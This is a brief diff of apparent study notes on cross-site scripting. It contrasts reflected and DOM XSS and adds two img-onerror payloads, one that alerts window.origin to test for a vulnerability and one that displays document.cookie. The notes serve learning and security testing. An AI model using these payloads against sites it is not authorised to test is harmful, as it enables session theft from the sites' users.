@@ -1,1 +1,5 @@
 When the reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. 
+
+
+<img src="" onerror=alert(window.origin)> :- To check if the server is vulnerable or not
+<img src="" onerror=alert(document.cookie)> :- To display the cookie. 
